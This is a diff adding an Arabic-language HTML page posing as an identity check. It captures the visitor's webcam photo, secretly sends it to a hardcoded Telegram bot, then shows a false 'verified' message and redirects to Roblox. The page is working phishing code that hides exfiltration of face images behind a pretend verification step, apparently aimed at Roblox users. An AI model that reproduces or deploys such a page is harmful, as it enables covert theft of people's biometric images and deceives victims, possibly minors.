@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>تحقق الهوية</title>
+</head>
+<body>
+    <h1>يرجى الوقوف أمام الكاميرا لتأكيد الهوية</h1>
+    <video id="video" autoplay style="width:300px;height:200px;"></video>
+    <button id="capture">التقاط الصورة</button>
+
+    <script>
+        const video = document.getElementById('video');
+        let stream = null;
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(s => {
+                stream = s;
+                video.srcObject = s;
+            })
+            .catch(() => alert('الرجاء السماح باستخدام الكاميرا'));
+
+        document.getElementById('capture').onclick = function() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            const botToken = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
+            const chatId = '6526473202';
+
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'face.jpg');
+                    return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                })
+                .then(() => {
+                    alert('تم التحقق! جارٍ توجيهك...');
+                    window.location.href = 'https://www.roblox.com';
+                })
+                .catch(() => alert('حدث خطأ، حاول مرة أخرى'));
+
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        };
+    </script>
+</body>
+</html>
